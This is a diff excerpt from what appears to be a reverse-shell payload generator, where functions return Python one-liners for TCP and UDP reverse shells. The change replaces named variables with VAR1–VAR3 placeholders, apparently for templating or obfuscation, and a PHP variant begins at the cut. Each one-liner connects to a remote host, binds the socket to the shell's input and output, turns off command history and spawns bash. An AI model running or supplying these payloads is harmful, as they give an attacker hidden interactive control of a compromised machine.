@@ -4,11 +4,11 @@ from classes import generate_file_name
 
 
 def REV_PYTHON_TCP():
-    return """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();\" """
+    return """python -c \"import os;import pty;import socket;VAR1='TARGET';VAR2=PORT;VAR3=socket.socket(socket.AF_INET,socket.SOCK_STREAM);VAR3.connect((VAR1,VAR2));os.dup2(VAR3.fileno(),0);os.dup2(VAR3.fileno(),1);os.dup2(VAR3.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');VAR3.close();\" """
 
 
 def REV_PYTHON_UDP():
-    return """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();\" """
+    return """python -c \"import os;import pty;import socket;VAR1='TARGET';VAR2=PORT;VAR3=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);VAR3.connect((VAR1, VAR2)); os.dup2(VAR3.fileno(),0);os.dup2(VAR3.fileno(),1);os.dup2(VAR3.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');VAR3.close();\" """
 
 
 def REV_PHP_TCP():
